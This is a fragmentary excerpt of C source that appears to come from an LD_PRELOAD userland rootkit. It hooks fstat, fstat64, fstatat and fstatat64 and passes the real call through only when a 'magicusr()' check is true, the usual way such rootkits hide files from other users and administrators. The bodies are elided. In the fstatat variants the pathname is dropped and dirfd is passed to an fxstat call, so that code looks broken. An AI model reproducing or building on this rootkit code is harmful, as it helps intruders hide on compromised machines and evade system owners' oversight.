int fstat(int fd, struct stat *buf){
    hook(C__FXSTAT);
    if(magicusr()) return (long)call(C__FXSTAT, _STAT_VER, fd, buf);
...
int fstat64(int fd, struct stat64 *buf){
    hook(C__FXSTAT64);
    if(magicusr()) return (long)call(C__FXSTAT64, _STAT_VER, fd, buf);
...
int fstatat(int dirfd, const char *pathname, struct stat *buf, int flags){
    hook(C__FXSTAT);
    //if(magicusr()) return (long)call(CFSTATAT, dirfd, pathname, buf, flags);
    if(magicusr()) return (long)call(C__FXSTAT, _STAT_VER, dirfd, buf);
...
int fstatat64(int dirfd, const char *pathname, struct stat64 *buf, int flags){
    hook(C__FXSTAT64);
    //if(magicusr()) return (long)call(CFSTATAT64, dirfd, pathname, buf, flags);
    if(magicusr()) return (long)call(C__FXSTAT64, _STAT_VER, dirfd, buf);
